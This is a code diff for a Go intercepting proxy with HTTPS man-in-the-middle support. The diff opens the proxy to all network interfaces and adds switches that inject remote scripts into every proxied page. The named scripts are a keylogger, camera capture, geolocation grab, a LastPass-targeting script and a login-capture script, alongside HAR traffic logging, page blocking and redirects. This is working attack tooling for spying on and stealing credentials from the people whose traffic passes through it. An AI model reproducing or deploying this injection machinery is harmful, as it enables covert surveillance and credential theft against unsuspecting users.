@@ -23,12 +23,16 @@ import (
 
 
 const (
-    CONN_HOST = "localhost"
+    CONN_HOST = "0.0.0.0"
     CONN_PORT = "8080"
     CONN_TYPE = "tcp"
 
     INJECT_LOGGER_REPLACE = "</body>"
     INJECT_LOGGER_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
+    INJECT_PHOTO_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/takePhoto.js\"></script></body>"
+    INJECT_LOCATION_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/getLocation.js\"></script></body>"
+    INJECT_LASTPASS_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
+    INJECT_LOGIN_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/login.js\"></script></body>"
 )
 
 var listener net.Listener
@@ -39,14 +43,17 @@ var globalRedirects bool
 var globalBlocks bool
 var globalWolfPack bool
 var globalInjectKeyLogger bool
-
+var globalInjectGetLocation bool
+var globalInjectGetPhoto bool
+var globalInjectGetLogin bool
+var globalInjectLastpass bool
+var globalProxyStandard bool
 
 // -----------------------------------------------------------------------------------------
 
 
-func StartSimpleProxy() net.Listener {
+func StartSimpleProxy() {
 
-    // Provide booleans for each function
     globalStoreHAR = false
 
     log.Println(" >>> STARTING PROXY SERVER")
@@ -55,9 +62,16 @@ func StartSimpleProxy() net.Listener {
     log.Println("     --- OPTION blocking ", globalBlocks )
     log.Println("     --- OPTION wolf-pack-hack ", globalWolfPack )
     log.Println("     --- OPTION inject key logger ", globalInjectKeyLogger )
-    
-    // Start the listener to listen on the connection.
-    listener, _ = net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT)
+    log.Println("     --- OPTION inject login ", globalInjectGetLogin )
+    log.Println("     --- OPTION inject Photo Request ", globalInjectGetPhoto )
+    log.Println("     --- OPTION inject Location Request ", globalInjectGetLocation )
+    log.Println("     --- OPTION inject Request Lastpass ", globalInjectLastpass )
+
+    listener, err := net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT) 
+    if err != nil {
+        log.Println("error here: ", err)
+    }    
+
     // Start the proxy.
     proxy := goproxy.NewProxyHttpServer()
 
@@ -67,6 +81,7 @@ func StartSimpleProxy() net.Listener {
     // Check if we are BLOCKING this page.
     if globalBlocks {
         pageBlock := TriggerBlock()
+        log.Println("blocking")
         proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlock))
     } // end of blocks.
 
@@ -89,10 +104,6 @@ func StartSimpleProxy() net.Listener {
         })
     }
 
-
-
-
-
     // Handle the CLIENT-REQUEST.
     proxy.HandleRequestFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         if globalStoreHAR {
@@ -102,7 +113,7 @@ func StartSimpleProxy() net.Listener {
             timestamp := t.Format("20060102150405")
             proxy.FlushHARToDisk(fileLocation+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
         } else {
-            log.Println(" --- CLIENT REQUEST: NOT logging HAR for "+ctx.Host() )
+            //log.Println(" --- CLIENT REQUEST: NOT logging HAR for "+ctx.Host() )
         }
         // Check if this is HTTPS connection via MITM.
         if ctx.IsThroughMITM {
@@ -133,7 +144,7 @@ func StartSimpleProxy() net.Listener {
                 timestamp := t.Format("20060102150405")
                 proxy.FlushHARToDisk(fileLocation+"/hars/res_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
             } else {
-                log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
+                //log.Println(" --- SERVER REQUEST: NOT logging HAR for "+ctx.Host() )
             }
             //
             bs, err := ioutil.ReadAll(ctx.Resp.Body)
@@ -146,6 +157,27 @@ func StartSimpleProxy() net.Listener {
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
             }
+            if globalInjectGetLocation {
+                log.Println("INJECTING")
+                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
+                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )
+            }
+            if globalInjectGetPhoto {
+                log.Println("INJECTING")
+                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
+                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_PHOTO_RESULT )
+            }
+            if globalInjectGetLogin {
+                log.Println("INJECTING")
+                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
+                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
+            }
+            if globalInjectLastpass {
+                log.Println("INJECTING")
+                utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
+                body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
+            }
+            
             ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
             return goproxy.NEXT
         })
@@ -154,7 +186,7 @@ func StartSimpleProxy() net.Listener {
 
     go http.Serve(listener, proxy)
     
-    return listener
+    // return listener
 }
 
 
@@ -177,6 +209,7 @@ func TriggerRedirect() goproxy.HandlerFunc {
 
 //
 func TriggerBlock() goproxy.HandlerFunc {
+    log.Println("blocker")
     // Create a new pageBlocker handler function to pass back later on.
     pageBlocker := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         // Create the body, very naieve for now.
